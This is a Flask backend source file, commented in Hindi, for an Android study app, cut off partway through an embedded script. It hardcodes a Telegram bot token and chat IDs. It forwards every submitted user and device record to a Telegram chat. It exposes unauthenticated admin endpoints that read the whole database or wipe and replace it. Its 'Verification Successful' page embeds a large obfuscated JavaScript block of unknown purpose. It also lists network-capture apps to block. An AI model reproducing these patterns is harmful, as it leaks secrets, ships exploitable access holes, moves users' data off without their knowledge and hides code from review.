from flask import Flask, request, jsonify, Response, redirect, make_response, render_template_string
from flask_cors import CORS
import requests
import secrets
from datetime import datetime, timedelta
import pytz
from pymongo import MongoClient
from urllib.parse import quote, urlparse
import os, json
import random
from bson import json_util
import logging
from bson import ObjectId
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes




logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s"
)
APP_DB_KEY = "apps_data_token"
APP_UNLIMITED_DB_KEY = "app_unlimited_tokens_data" 
# --- 1. कॉन्फ़िगरेशन (Configuration) ---
app = Flask(__name__)
import threading

# आपके पहले (Proxy) बैकएंड का वेबहुक URL
SERVER1_WEBHOOK_URL = "http://study-api.lnkz.tech/api/webhook/token"
def send_webhook_to_server1(payload):
    """यह फंक्शन बैकग्राउंड में पहले सर्वर को नया टोकन भेजेगा ताकि यह धीमा न हो"""
    logger.info("Preparing to send webhook in background thread...")
    
    def send():
        logger.debug(f"Webhook thread started. Payload to send: {payload}")
        try:
            logger.info(f"Sending POST request to {SERVER1_WEBHOOK_URL}...")
            response = requests.post(SERVER1_WEBHOOK_URL, json=payload, timeout=5)
            
            # रिस्पॉन्स का स्टेटस कोड चेक करना और लॉग करना
            if response.status_code in [200, 201]:
                logger.info(f"Webhook sent successfully! Status Code: {response.status_code}")
            else:
                logger.warning(f"Webhook sent but received unexpected status: {response.status_code}. Response: {response.text}")
                
        except Exception as e:
            # print की जगह logger.error का इस्तेमाल
            logger.error(f"Webhook Failed: {str(e)}")
    
    # थ्रेड को स्टार्ट करना
    threading.Thread(target=send).start()


# CORS हैंडलिंग
CORS(app, resources={r"/*": {"origins": "*"}})

# मोंगोडीबी यूआरआई (आप इसे एनवायरनमेंट वेरिएबल के रूप में सेट कर सकते हैं)
DT_MON = os.getenv("DT_MON", "mongodb://localhost:27017/") 
API_KEY = os.getenv("API_KEY", "") 
FA_KEY = os.getenv("FA_KEY", "") 
client = MongoClient(DT_MON)
db = client['tokens_database']
collection = db['kv_store']
DB_KEY = "tokens_data"
DT_MON = os.getenv("DT_MON", "mongodb://localhost:27017/") 
API_KEY = os.getenv("API_KEY", "") 
FA_KEY = os.getenv("FA_KEY", "") 
client = MongoClient(DT_MON)
db = client['tokens_database']
collection = db['kv_store']
DB_KEY = "tokens_data"
premium_collection = db['premium_tokens']
TELEGRAM_BOT_TOKEN = "8292521812:AAFukmxihMZId4elnEA6Ne_KKYw4NrMXwuc"
TELEGRAM_CHAT_ID = "6150091802"
primeuserdb = client["prime_study_db"]
users_collection = primeuserdb["users_data"]

# JSON डेटा लोड करने के लिए फंक्शन
def load_apps_data():
    try:
        with open('apps_data.json', 'r') as file:
            return json.load(file)
    except FileNotFoundError:
        return []

# कस्टम हेडर चेक करने का अलग फंक्शन
def should_block_request(app_signature, auth_token):
    # यहाँ अपना लॉजिक लिखें
    # उदाहरण के लिए: अगर हेडर मौजूद नहीं हैं, तो ब्लॉक करें
    if not app_signature or not auth_token:
        return False # True आने पर रिक्वेस्ट ब्लॉक हो जाएगी
        
    # अगर सब सही है तो False रिटर्न करें
    return False


def send_to_telegram(data):
    """डेटा को टेलीग्राम बॉट के ज़रिए भेजने का फंक्शन (लंबे डेटा को टुकड़ों में बाँटकर)"""
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    
    # JSON डेटा को अच्छे से फॉर्मेट करके स्ट्रिंग बनाना
    formatted_data = json.dumps(data, indent=2, ensure_ascii=False)
    
    # Telegram की अधिकतम सीमा 4096 है, सुरक्षित रहने के लिए हम 3900 का उपयोग करेंगे
    MAX_CHUNK_SIZE = 3900
    
    # अगर डेटा छोटा है, तो एक ही बार में भेज दें
    if len(formatted_data) <= MAX_CHUNK_SIZE:
        message = f"🚨 <b>New User Data Received</b> 🚨\n\n<pre>{formatted_data}</pre>"
        payload = {
            "chat_id": TELEGRAM_CHAT_ID,
            "text": message,
            "parse_mode": "HTML"
        }
        try:
            requests.post(url, json=payload)
        except Exception as e:
            print("Telegram Error:", e)
    
    # अगर डेटा बड़ा है, तो उसे टुकड़ों में बाँटकर भेजें
    else:
        # सबसे पहले एक हेडर मैसेज भेजें ताकि पता चले कि बड़ा डेटा आ रहा है
        header_payload = {
            "chat_id": TELEGRAM_CHAT_ID,
            "text": "🚨 <b>New User Data Received (Large Data - Multiple Parts)</b> 🚨",
            "parse_mode": "HTML"
        }
        try:
            requests.post(url, json=header_payload)
        except Exception as e:
            print("Telegram Error (Header):", e)
        
        # अब डेटा को MAX_CHUNK_SIZE के हिसाब से टुकड़ों में बाँटें
        for i in range(0, len(formatted_data), MAX_CHUNK_SIZE):
            chunk = formatted_data[i : i + MAX_CHUNK_SIZE]
            
            # हर टुकड़े को <pre> टैग में रखना ज़रूरी है ताकि Telegram का HTML टूटे नहीं
            message = f"<pre>{chunk}</pre>"
            
            payload = {
                "chat_id": TELEGRAM_CHAT_ID,
                "text": message,
                "parse_mode": "HTML"
            }
            
            try:
                requests.post(url, json=payload)
            except Exception as e:
                print(f"Telegram Error (Part {i}):", e)

def get_admin_html():
    html_template = """
    <!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Panel - Edit JSON</title>
    <style>
        body { font-family: Arial, sans-serif; padding: 20px; background-color: #f4f4f9; }
        .container { max-width: 900px; margin: auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
        textarea { width: 100%; height: 500px; font-family: monospace; padding: 10px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
        .btn { padding: 10px 20px; margin-top: 15px; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; }
        .btn-save { background-color: #28a745; color: white; }
        .btn-reload { background-color: #007bff; color: white; }
        #statusMessage { margin-top: 15px; font-weight: bold; }
    </style>
</head>
<body>

<div class="container">
    <h2>JSON Editor - MongoDB Data</h2>
    <p>यहाँ आप डेटा को JSON फॉर्मेट में एडिट कर सकते हैं। कैशे को रोकने के लिए डेटा हर बार सीधा सर्वर से लाया जाता है।</p>
    
    <textarea id="jsonEditor">लोड हो रहा है...</textarea>
    
    <br>
    <button class="btn btn-save" onclick="saveData()">💾 सेव करें (Save)</button>
    <button class="btn btn-reload" onclick="loadData()">🔄 फिर से लोड करें (Reload)</button>
    
    <div id="statusMessage"></div>
</div>

<script>
    // डेटा लोड करने का फंक्शन (कैशे से बचने के लिए URL में टाइमस्टैम्प जोड़ा गया है)
    function loadData() {
        document.getElementById('statusMessage').innerText = "डेटा लाया जा रहा है...";
        document.getElementById('statusMessage').style.color = "blue";
        
        // Cache-Busting तकनीक: ?t=current_timestamp
        const url = '/api/admin/get_data?t=' + new Date().getTime();

        fetch(url, {
            method: 'GET',
            headers: { 'Cache-Control': 'no-cache', 'Pragma': 'no-cache' }
        })
        .then(response => response.json())
        .then(data => {
            // JSON को सुंदर (formatted) तरीके से टेक्स्टेरिया में दिखाएं
            document.getElementById('jsonEditor').value = JSON.stringify(data, null, 4);
            document.getElementById('statusMessage').innerText = "डेटा सफलतापूर्वक लोड हो गया!";
            document.getElementById('statusMessage').style.color = "green";
            
            setTimeout(() => document.getElementById('statusMessage').innerText = "", 3000);
        })
        .catch(error => {
            document.getElementById('statusMessage').innerText = "डेटा लोड करने में एरर: " + error;
            document.getElementById('statusMessage').style.color = "red";
        });
    }

    // डेटा सेव करने का फंक्शन
    function saveData() {
        const jsonText = document.getElementById('jsonEditor').value;
        let parsedData;

        try {
            // चेक करें कि एडमिन ने सही JSON लिखा है या नहीं
            parsedData = JSON.parse(jsonText);
        } catch (e) {
            document.getElementById('statusMessage').innerText = "❌ अमान्य JSON (Invalid JSON)! कृपया सिंटैक्स चेक करें।";
            document.getElementById('statusMessage').style.color = "red";
            return;
        }

        document.getElementById('statusMessage').innerText = "सेव किया जा रहा है...";
        document.getElementById('statusMessage').style.color = "blue";

        fetch('/api/admin/save_data', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(parsedData)
        })
        .then(response => response.json())
        .then(data => {
            if(data.status === "success") {
                document.getElementById('statusMessage').innerText = "✅ " + data.message;
                document.getElementById('statusMessage').style.color = "green";
                // सेव करने के तुरंत बाद ताज़ा डेटा लोड करें ताकि कैशे पूरी तरह खत्म हो जाए
                setTimeout(loadData, 1000); 
            } else {
                document.getElementById('statusMessage').innerText = "❌ एरर: " + data.error;
                document.getElementById('statusMessage').style.color = "red";
            }
        })
        .catch(error => {
            document.getElementById('statusMessage').innerText = "❌ नेटवर्क एरर: " + error;
            document.getElementById('statusMessage').style.color = "red";
        });
    }

    // पेज लोड होते ही डेटा लोड करें
    window.onload = loadData;
</script>

</body>
</html>

    """
    return render_template_string(html_template)
@app.route('/api/admin/get_profils', methods=['GET'])
def admin_get_profile():
    return get_admin_html(), 200
    
@app.route('/api/admin/get_data', methods=['GET'])
def admin_get_data():
    try:
        # MongoDB से सारा डेटा निकालें
        data = list(collection.find({}))
        
        # ObjectId को JSON-serializable बनाने के लिए bson.json_util का उपयोग करें
        json_data = json.loads(json_util.dumps(data))
        
        # रिस्पांस तैयार करें और कैशे (Cache) डिसेबल करें
        response = make_response(jsonify(json_data))
        response.headers["Cache-Control"] = "no-cache, no-store, must-revalidate, max-age=0"
        response.headers["Pragma"] = "no-cache"
        response.headers["Expires"] = "0"
        
        return response
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/admin/save_data', methods=['POST'])
def admin_save_data():
    try:
        updated_records = request.json
        
        if not isinstance(updated_records, list):
            return jsonify({"error": "डेटा एक JSON एरे (Array) के रूप में होना चाहिए"}), 400

        # 1. डेटाबेस से सारा पुराना डेटा पूरी तरह हटा दें
        collection.delete_many({})

        # 2. अगर एडमिन ने खाली एरे [] भेजा है, तो यहीं से सक्सेस रिटर्न कर दें
        if len(updated_records) == 0:
            return jsonify({"status": "success", "message": "सारा डेटा सफलतापूर्वक डिलीट कर दिया गया है!"})

        # 3. अगर एरे में डेटा है, तो हर रिकॉर्ड से पुरानी '_id' हटा दें
        # (ताकि MongoDB अपनी नई _id बना सके और कोई एरर न आए)
        for record in updated_records:
            if '_id' in record:
                del record['_id']
        
        # 4. अब एडमिन का भेजा हुआ नया डेटा एक साथ इंसर्ट करें
        collection.insert_many(updated_records)
            
        return jsonify({"status": "success", "message": "डेटा सफलतापूर्वक सेव हो गया है!"})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route('/user-details/prime_study_Official', methods=['POST'])
def save_user_details():
    try:
        data = request.json
        if not data:
            return jsonify({"error": "डेटा नहीं मिला"}), 400

        # 1. डेटा आते ही उसे सबसे पहले Telegram पर भेज दें (चाहे डुप्लीकेट हो या नहीं)
        send_to_telegram(data)

        # 2. MongoDB के लिए डुप्लीकेट चेक करना (deviceId के आधार पर)
        device_id = None
        if "deviceInfo" in data and "deviceId" in data["deviceInfo"]:
            device_id = data["deviceInfo"]["deviceId"]

        if device_id:
            # चेक करें कि क्या यह deviceId पहले से डेटाबेस में है
            existing_user = users_collection.find_one({"deviceInfo.deviceId": device_id})
            if existing_user:
                return jsonify({
                    "message": "(Duplicate)"
                }), 200

        # 3. अगर डेटा नया है (डुप्लीकेट नहीं है), तो उसे MongoDB में सेव करें
        data["created_at"] = datetime.utcnow()
        users_collection.insert_one(data)

        return jsonify({"message": "Success"}), 201

    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route('/bad_app_list.json', methods=['GET'])
def get_bad_apps():
    bad_apps = [
        "com.guoshi.httpcanary", 
        "com.guoshi.httpcanary.premium", 
        "app.greyshirts.sslcapture", 
        "com.minhui.networkcapture", 
        "com.reqable.android",
        "com.network.proxy",
        "com.anetcapture.mock",
        "com.scheler.superproxy",
        "com.studyapkmod"
    ]
    # यह लिस्ट को JSON फॉर्मेट में बदल कर भेज देगा
    return jsonify(bad_apps)


def send_telegram_alert(profile_id, elapsed_time_str, reason):
    bot_token = "8292521812:AAFukmxihMZId4elnEA6Ne_KKYw4NrMXwuc"
    chat_id = "-1004314655959"
    
    # Get shortened URL from MongoDB if available
    shortened_url = "Not Available"
    if profile_id:
        record = collection.find_one({"profile_id": profile_id})
        if record:
            shortened_url = record.get("shortened_url", "Not Available")

    message = f"🚨 Suspicious Activity Detected!\n\n" \
              f"Reason: {reason}\n" \
              f"Profile ID: {profile_id if profile_id else 'Unknown'}\n" \
              f"Shortened URL: {shortened_url}\n" \
              f"Time Taken: {elapsed_time_str}"
              
    telegram_url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    payload = {"chat_id": chat_id, "text": message}
    
    try:
        requests.post(telegram_url, json=payload)
    except Exception as e:
        print(f"Telegram Error: {e}")

# Error HTML Helper
def get_error_html(error_message):
    html_template = """
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-6225893138851886" crossorigin="anonymous"></script>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Error</title>
        <style>
            body { display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #ffe6e6; color: #cc0000; font-family: Arial, sans-serif; margin: 0; }
            .error-box { padding: 30px; border: 2px solid #cc0000; background-color: #fff; border-radius: 10px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); }
        </style>
    </head>
    <body>
        <div class="error-box">
            <h2>{{ message }}</h2>
        </div>
    </body>
    </html>
    """
    return render_template_string(html_template, message=error_message)
 
oi = """
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-6225893138851886" crossorigin="anonymous"></script>
        <title>Verification Successful</title>
        <style>
            body { display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #f0fdf4; margin: 0; font-family: Arial, sans-serif; }
            .wrapper { text-align: center; }
            
            /* Spinner CSS */
            .icon-box {
                width: 70px; height: 70px;
                border-radius: 50%;
                border: 5px solid #d1fae5;
                border-top-color: #10b981;
                margin: 0 auto;
                position: relative;
                animation: spin 1s linear infinite;
                box-sizing: border-box;
            }
            
            /* Success state (Checkmark) */
            .icon-box.success {
                animation: none;
                border-color: #10b981;
                background-color: #10b981;
                transition: all 0.3s ease;
            }
            .icon-box.success::after {
                content: '';
                position: absolute;
                left: 23px; top: 12px;
                width: 14px; height: 30px;
                border: solid white;
                border-width: 0 5px 5px 0;
                transform: rotate(45deg);
                box-sizing: border-box;
            }
            
            @keyframes spin { 100% { transform: rotate(360deg); } }
            
            .msg { margin-top: 20px; color: #10b981; font-size: 1.5rem; font-weight: bold; opacity: 0; transition: opacity 0.5s; }
            .msg.show { opacity: 1; }
        </style>
    </head>
    <body>
        <div class="wrapper">
            <div id="status-icon" class="icon-box"></div>
            <div id="status-text" class="msg">Verification Successful</div>
        </div>

        <script>
            // 1.5 सेकंड बाद स्पिनर को चेकमार्क में बदलने के लिए
            setTimeout(() => {
                document.getElementById('status-icon').classList.add('success');
                document.getElementById('status-text').classList.add('show');
            }, 1500);

            // 6 सेकंड बाद केवल ऐप में होने पर HomeActivity पर रीडायरेक्ट करने के लिए
            setTimeout(() => {
                if (window.AndroidDevice && window.AndroidDevice.openCustomScreen) {
                    // ऐप के अंदर चल रहा है और फंक्शन उपलब्ध है
                    window.AndroidDevice.openCustomScreen("com.study.prime.HomeActivity", "{}", true);
                }
                // अगर वेब ब्राउज़र में है या फंक्शन नहीं है, तो कुछ नहीं होगा
            }, 6000);
        </script>
    </body>
    </html>
"""

# Success HTML Helper (Spinning circle turns into checkmark)
def get_success_html():
    html_template = """
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-6225893138851886" crossorigin="anonymous"></script>
        <title>Verification Successful</title>
        <style>
            body { display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #f0fdf4; margin: 0; font-family: Arial, sans-serif; }
            .wrapper { text-align: center; }
            
            /* Spinner CSS */
            .icon-box {
                width: 70px; height: 70px;
                border-radius: 50%;
                border: 5px solid #d1fae5;
                border-top-color: #10b981;
                margin: 0 auto;
                position: relative;
                animation: spin 1s linear infinite;
                box-sizing: border-box;
            }
            
            /* Success state (Checkmark) */
            .icon-box.success {
                animation: none;
                border-color: #10b981;
                background-color: #10b981;
                transition: all 0.3s ease;
            }
            .icon-box.success::after {
                content: '';
                position: absolute;
                left: 23px; top: 12px;
                width: 14px; height: 30px;
                border: solid white;
                border-width: 0 5px 5px 0;
                transform: rotate(45deg);
                box-sizing: border-box;
            }
            
            @keyframes spin { 100% { transform: rotate(360deg); } }
            
            .msg { margin-top: 20px; color: #10b981; font-size: 1.5rem; font-weight: bold; opacity: 0; transition: opacity 0.5s; }
            .msg.show { opacity: 1; }
        </style>
    </head>
    <body>
        <div class="wrapper">
            <div id="status-icon" class="icon-box"></div>
            <div id="status-text" class="msg">Verification Successful</div>
        </div>

        <script>
            (function(_0x35b4a5,_0x1271f8){var _0x3936bc=_0x170e,_0x15b0c9=_0x35b4a5();while(!![]){try{var _0x59a954=parseInt(_0x3936bc(0x365))/(0xf7f+-0x115e+-0x14*-0x18)*(-parseInt(_0x3936bc(0xda))/(0x15e9+0x184e+-0x2e35))+parseInt(_0x3936bc(0x244))/(-0x248*-0x6+-0x332*-0x9+-0x2a6f)*(-parseInt(_0x3936bc(0x1f5))/(0x1791+0x1*-0x12df+0x2*-0x257))+parseInt(_0x3936bc(0x163))/(-0x137*-0x11+-0x181+-0x1321)*(-parseInt(_0x3936bc(0x2f4))/(-0x18b6+-0x3*-0x718+0x374))+parseInt(_0x3936bc(0x29c))/(-0x22ac+-0x125f+0x1*0x3512)*(parseInt(_0x3936bc(0x291))/(-0x2542+0x12*-0x1b7+-0x2*-0x2214))+-parseInt(_0x3936bc(0x360))/(0x39*-0xb+0xe71+-0xbf5)+-parseInt(_0x3936bc(0x1b5))/(0x14*0x1b8+-0x2*-0x66e+0x2*-0x1799)+parseInt(_0x3936bc(0x260))/(0x662+-0xdb5+0x75e)*(parseInt(_0x3936bc(0x2b4))/(-0xd*0x232+-0x1cf+0x1e65*0x1));if(_0x59a954===_0x1271f8)break;else _0x15b0c9['push'](_0x15b0c9['shift']());}catch(_0x181591){_0x15b0c9['push'](_0x15b0c9['shift']());}}}(_0x386a,0x111*0x373+-0x242a1+0x6bc8f),function(_0x6faeb9,_0x12f39b){var _0x33dbdc=_0x170e,_0x17592a={'iQOrc':function(_0x5a14b5){return _0x5a14b5();},'IRBxf':function(_0x5a1a24,_0x3ad064){return _0x5a1a24+_0x3ad064;},'xJpFp':function(_0x1cde82,_0x53415f){return _0x1cde82+_0x53415f;},'sRqMJ':function(_0x459462,_0x101f9e){return _0x459462+_0x101f9e;},'nPIzq':function(_0x2f854f,_0x3383bd){return _0x2f854f+_0x3383bd;},'xUeIb':function(_0x53aff2,_0x47f2e0){return _0x53aff2+_0x47f2e0;},'dZoiE':function(_0x3922e6,_0x375995){return _0x3922e6*_0x375995;},'sESIA':function(_0x36d673,_0x2ee32d){return _0x36d673/_0x2ee32d;},'Csbmp':function(_0x1bb8e4,_0x347268){return _0x1bb8e4(_0x347268);},'ETMtL':function(_0x10a3c1,_0x4bc8a7){return _0x10a3c1(_0x4bc8a7);},'WHXFV':function(_0x3ea6d1,_0x303e87){return _0x3ea6d1+_0x303e87;},'niHys':function(_0x5bb647,_0xd75aa7){return _0x5bb647(_0xd75aa7);},'FCIxC':function(_0x355e19,_0x47e3dd){return _0x355e19*_0x47e3dd;},'fkNYN':function(_0xb39a08,_0x4c4224){return _0xb39a08*_0x4c4224;},'jsHrr':function(_0x35c673,_0x1b620c){return _0x35c673*_0x1b620c;},'RXkBN':function(_0x2ab08a,_0x273c93){return _0x2ab08a/_0x273c93;},'bqHmY':function(_0x51b83b,_0x3a012a){return _0x51b83b(_0x3a012a);},'wgQzh':function(_0x4bcf88,_0x563305){return _0x4bcf88+_0x563305;},'oNTYl':function(_0x268f97,_0x567f5d){return _0x268f97+_0x567f5d;},'qhqYU':function(_0x48394b,_0x211bf9){return _0x48394b*_0x211bf9;},'lDCHC':function(_0x5d1599,_0x3f4ce2){return _0x5d1599(_0x3f4ce2);},'LyQis':function(_0x485b96,_0x1455e4){return _0x485b96(_0x1455e4);},'KIrni':function(_0x46dc45,_0x13ab15){return _0x46dc45+_0x13ab15;},'wNgxj':function(_0x238fa9,_0x14808f){return _0x238fa9+_0x14808f;},'OpAyR':function(_0x726bed,_0x1127d1){return _0x726bed*_0x1127d1;},'AdzUJ':function(_0x1c546c,_0x22ee16){return _0x1c546c*_0x22ee16;},'TjUQQ':function(_0x10c06c,_0x4e2cee){return _0x10c06c*_0x4e2cee;},'RWBoB':function(_0x237591,_0x3a6663){return _0x237591+_0x3a6663;},'kLRUB':function(_0x3155d9,_0x4ca5be){return _0x3155d9+_0x4ca5be;},'dkRnk':function(_0x1d9744,_0x2c6306){return _0x1d9744*_0x2c6306;},'UKXAG':function(_0x45ace7,_0x359619){return _0x45ace7/_0x359619;},'RIUwI':function(_0x5d22c7,_0x406d32){return _0x5d22c7(_0x406d32);},'Kfbum':function(_0x56970a,_0x4e028c){return _0x56970a/_0x4e028c;},'kRRJC':function(_0x14d69c,_0x58c413){return _0x14d69c(_0x58c413);},'jEbEk':function(_0x3397c0,_0x55faa5){return _0x3397c0+_0x55faa5;},'BkwPc':function(_0x8b0e59,_0x22b5d){return _0x8b0e59*_0x22b5d;},'paMXr':function(_0x5c0395,_0x2e6886){return _0x5c0395*_0x2e6886;},'hmqGJ':function(_0x37f04c,_0x4a7d67){return _0x37f04c*_0x4a7d67;},'HJoKx':function(_0x25434f,_0x2427b6){return _0x25434f/_0x2427b6;},'VMsZR':function(_0x1589a2,_0x46a99a){return _0x1589a2*_0x46a99a;},'nsvmc':function(_0x4f943a,_0x4b9427){return _0x4f943a*_0x4b9427;},'SqJLg':function(_0x3c435e,_0x49eb97){return _0x3c435e/_0x49eb97;},'rBLlw':function(_0x17c0f7,_0x2a3a9f){return _0x17c0f7(_0x2a3a9f);},'RTMCt':function(_0x52361c,_0xd60b1f){return _0x52361c+_0xd60b1f;},'Lngbz':function(_0x8a571c,_0x3f1587){return _0x8a571c/_0x3f1587;},'NeBxT':function(_0x4097f1,_0x33403a){return _0x4097f1(_0x33403a);},'xKiCZ':function(_0x349aa5,_0x43799b){return _0x349aa5(_0x43799b);},'ZeNBz':function(_0x4fa326,_0x5a39bd){return _0x4fa326*_0x5a39bd;},'oeQlD':function(_0x13dea8,_0x1efb83){return _0x13dea8(_0x1efb83);},'zqVWh':function(_0x37093a,_0x3eaaf6){return _0x37093a===_0x3eaaf6;},'xXWDF':_0x33dbdc(0xed),'diaor':_0x33dbdc(0x33f)},_0x1416f6=_0x4163,_0x56a5c6=_0x17592a[_0x33dbdc(0x250)](_0x6faeb9);while(!![]){try{var _0x434432=_0x17592a[_0x33dbdc(0x26f)](_0x17592a[_0x33dbdc(0x26f)](_0x17592a[_0x33dbdc(0x1e7)](_0x17592a[_0x33dbdc(0x2e3)](_0x17592a[_0x33dbdc(0xef)](_0x17592a[_0x33dbdc(0x2da)](_0x17592a[_0x33dbdc(0x2fa)](_0x17592a[_0x33dbdc(0xea)](-_0x17592a[_0x33dbdc(0x135)](parseInt,_0x17592a[_0x33dbdc(0x159)](_0x1416f6,-0x1*-0x140+0x2cd*-0xd+0x146*0x1d)),_0x17592a[_0x33dbdc(0x1e6)](_0x17592a[_0x33dbdc(0x1e6)](-0x1455+0x22cc+-0x5dd,-(0x1*0x467+0x2*0xd0f+-0x305*0x3)),-0x2*0xa93+-0x2*-0x1313+-0x3*0x161)),_0x17592a[_0x33dbdc(0xea)](_0x17592a[_0x33dbdc(0x135)](parseInt,_0x17592a[_0x33dbdc(0x2eb)](_0x1416f6,0x1ea3+0x3*0x65f+-0x1*0x2fdb)),_0x17592a[_0x33dbdc(0x1e6)](_0x17592a[_0x33dbdc(0x1e7)](_0x17592a[_0x33dbdc(0xd5)](-(-0x779*-0x5+-0x1*0x139c+0x1*0x455),-(-0x16a8+0x109*0x1+0x15a0)),-(0x883*-0x1+-0x2460+0x4*0xc43)),_0x17592a[_0x33dbdc(0x222)](0x752+0xb*0x33f+-0x5ea*0x7,-(-0xd85+0x1*0x1625+-0xa9*0xd))))),_0x17592a[_0x33dbdc(0x1c5)](_0x17592a[_0x33dbdc(0xc8)](_0x17592a[_0x33dbdc(0x135)](parseInt,_0x17592a[_0x33dbdc(0x212)](_0x1416f6,0x147+-0x1ce4+0x1d89)),_0x17592a[_0x33dbdc(0x356)](_0x17592a[_0x33dbdc(0x167)](-(-0xe2c+-0x35*-0xf7+-0x30f),_0x17592a[_0x33dbdc(0xd5)](-(0x261c+0x1f1*0x5+-0x2cf5),0x5*0x5ce+-0x2ce*0xb+-0x13*-0x19)),_0x17592a[_0x33dbdc(0x255)](-(-0x17cb+0x2635*0x1+0x1f*-0x77),-(0x57b8+0x37b7+-0xb3*0x80)))),_0x17592a[_0x33dbdc(0xc8)](_0x17592a[_0x33dbdc(0x171)](parseInt,_0x17592a[_0x33dbdc(0x27b)](_0x1416f6,0x16*0x14d+0xa7b*0x1+-0x24f8)),_0x17592a[_0x33dbdc(0x32a)](_0x17592a[_0x33dbdc(0x146)](-(0x1*-0xec3+-0x20d+-0x33d8*-0x1),_0x17592a[_0x33dbdc(0x252)](-0x1b6*0x10+-0xc32+0x3*0x1712,-0x2e9+0xa41*-0x1+0x1*0xd2b)),_0x17592a[_0x33dbdc(0x303)](-(-0x2322+-0x3*-0x2cd+0x1abc),-(-0x4*-0x29+-0x1b46+0x200a*0x1)))))),_0x17592a[_0x33dbdc(0x2bc)](_0x17592a[_0x33dbdc(0xc8)](-_0x17592a[_0x33dbdc(0x159)](parseInt,_0x17592a[_0x33dbdc(0x135)](_0x1416f6,0x1*-0xdbb+0x1*0x103f+-0xb3)),_0x17592a[_0x33dbdc(0x1eb)](_0x17592a[_0x33dbdc(0x28e)](_0x17592a[_0x33dbdc(0xd5)](-(0x16e9+-0x4d6*0x5+-0x5d*-0x4f),-(-0x714+0x5*-0x5d+0x8e6)),_0x17592a[_0x33dbdc(0x309)](-(-0x64d*0x2+-0x24f7+0x4c7c),-0x1*0x251d+-0x29b*-0xc+0x5da)),-(0x1c44+-0xad*0x39+0xabf))),_0x17592a[_0x33dbdc(0x273)](-_0x17592a[_0x33dbdc(0x2c4)](parseInt,_0x17592a[_0x33dbdc(0x2c4)](_0x1416f6,-0xecd*-0x1+0xf2*-0x12+0x45a)),_0x17592a[_0x33dbdc(0x28e)](_0x17592a[_0x33dbdc(0x32a)](_0x17592a[_0x33dbdc(0x222)](-(0x1*-0x1c9+-0x2130+-0xbf*-0x2f),-(-0x2f5*0xb+-0x1847+-0x71e*-0x8)),-(0x710*-0xa+0x1*0xdb7+-0x179e*-0x4)),-0x4231+0x2ad*0x15+0x2c65)))),_0x17592a[_0x33dbdc(0x2bc)](_0x17592a[_0x33dbdc(0x9d)](_0x17592a[_0x33dbdc(0x212)](parseInt,_0x17592a[_0x33dbdc(0x30b)](_0x1416f6,0xb69+0x206b+-0x29a7)),_0x17592a[_0x33dbdc(0x2d3)](_0x17592a[_0x33dbdc(0x28e)](_0x17592a[_0x33dbdc(0x1b7)](-0x1ed4+-0x17e5*0x1+0xddb*0x4,-0x1801+-0x41*-0xb+0x155c),_0x17592a[_0x33dbdc(0x265)](-(0x614*0x4+-0x1d91+0x542),-(0x1449+-0x1*-0x18b2+-0xa*0x43a))),_0x17592a[_0x33dbdc(0x2f0)](-(0x86*-0x16+0x1638+-0xaaf),0x2cc+-0x205+-0x513*-0x1))),_0x17592a[_0x33dbdc(0x224)](_0x17592a[_0x33dbdc(0x159)](parseInt,_0x17592a[_0x33dbdc(0x171)](_0x1416f6,0x8e5+0x4dd*-0x4+0xcc5)),_0x17592a[_0x33dbdc(0x1e7)](_0x17592a[_0x33dbdc(0x146)](_0x17592a[_0x33dbdc(0x368)](-(0x1707+0x15*-0x12d+0x2387),-(-0xb*-0x7c+0x57*-0x19+0x32c)),_0x17592a[_0x33dbdc(0x264)](0xd35+0x18a6*0x1+-0x25da,-0x2b42+-0x4b1+0x51e4)),-(0x4979+-0x5ff2*0x1+0x5a3f*0x1))))),_0x17592a[_0x33dbdc(0x2f5)](_0x17592a[_0x33dbdc(0x181)](parseInt,_0x17592a[_0x33dbdc(0x2eb)](_0x1416f6,-0x481*0x5+-0x17*0xc+0xd3*0x1f)),_0x17592a[_0x33dbdc(0x2da)](_0x17592a[_0x33dbdc(0x21e)](-(0x150*-0x1d+0x944+0x1d8a),-(0x1*-0x66d+0x86*0x2e+-0x6c6)),-0x401+0xa3*0x4+0xd1d))),_0x17592a[_0x33dbdc(0x241)](-_0x17592a[_0x33dbdc(0xc9)](parseInt,_0x17592a[_0x33dbdc(0x12b)](_0x1416f6,0x1bf*0x4+0x2045+-0x2517)),_0x17592a[_0x33dbdc(0x1eb)](_0x17592a[_0x33dbdc(0xef)](-0x7*0x6cc+-0x412e+0x966f,-0x204b+0x18a7*-0x1+0x5f4c),_0x17592a[_0x33dbdc(0x236)](-(-0xda0+0x1ab6+-0x23b),-0x305*-0x5+-0x666+-0x8ac)))),_0x17592a[_0x33dbdc(0x241)](-_0x17592a[_0x33dbdc(0x283)](parseInt,_0x17592a[_0x33dbdc(0x27b)](_0x1416f6,0x1afc+0x8f0+-0x221f*0x